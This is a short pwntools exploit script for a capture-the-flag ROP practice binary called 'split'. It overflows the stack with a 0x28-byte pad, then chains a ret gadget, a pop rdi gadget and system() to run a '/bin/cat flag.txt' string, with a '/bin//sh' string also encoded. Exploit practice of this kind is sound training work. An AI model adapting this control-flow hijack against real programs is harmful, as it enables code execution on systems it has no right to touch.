from pwn import *

context.binary=exe=ELF("./split",checksec=False)
p=process(exe.path)
#gdb.attach(p,gdbscript="""	start	b*0x0000000000400741,	continue	""")
offset=0x28
useful_function=0x400742
main=0x400697
#0x000000000040053b: add esp, 8; ret;
add_esp_8_ret=0x000000000040053b
ret=0x000000000040053e
pop_rdi_ret=0x00000000004007c3
bin_cat_flag=0x601060
system=0x400560
str_cat=p64(0x2F62696E2F636174)+ p64(0x20666C61672E7478)+p64(0x7400)
bin_sh=0x2F62696E2F2F7368
#input() for debug
payload=b"A"*offset+p64(ret)+p64(pop_rdi_ret)+p64(bin_cat_flag)+p64(system)
print(len(payload))
p.sendlineafter(b">",payload)

p.interactive()